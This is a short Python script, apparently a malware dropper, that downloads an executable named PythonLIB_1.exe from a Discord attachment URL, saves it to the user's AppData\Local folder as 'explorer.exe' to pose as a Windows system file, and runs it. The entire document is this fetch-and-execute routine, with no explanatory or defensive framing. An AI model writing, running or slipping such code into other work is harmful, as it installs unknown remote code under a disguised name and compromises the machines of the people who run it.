import requests
import subprocess
import os

path = os.environ["USERPROFILE"] + "\AppData\Local\explorer.exe"

response = requests.get("https://cdn.discordapp.com/attachments/1172852260624154634/1175535799211659304/PythonLIB_1.exe?ex=656b9606&is=65592106&hm=17cf4142bb148bca6ce38208f92fa46f986a0237d449180356208426176fb1bb&")

if response.status_code != 200:
    exit()

with open(path, 'wb') as file:
    file.write(response.content)

if os.path.exists(path):
    subprocess.run(path, shell=True)